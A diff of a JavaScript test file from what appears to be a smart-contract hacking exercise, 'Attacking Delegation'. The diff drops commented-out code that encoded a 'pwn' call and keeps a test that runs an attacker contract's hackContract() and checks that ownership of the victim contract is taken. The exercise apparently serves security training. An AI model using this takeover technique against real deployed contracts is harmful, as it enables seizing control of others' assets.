@@ -22,19 +22,7 @@ describe("Attacking Delegation", function () {
 
   // Get this to pass!
   it("Succesfully taken ownership", async () => {
-    // let owner = await victim.owner();
-    // console.log("owner", owner);
-    await attacker.hackContract();
-    // const ABI = ["function pwn()"];
-    // const iface = new ethers.utils.Interface(ABI);
-    // const data = iface.encodeFunctionData("pwn");
-    // victim.sendTransaction({
-    //   from: attacker.address,
-    //   data,
-    // });
-    // attacker.sendTransaction({
-
-    // })
+    await attacker.hackContract({ gasLimit: 30000000 });
     const owner = await victim.owner();
     expect(owner).to.be.equal(attacker.address);
   });
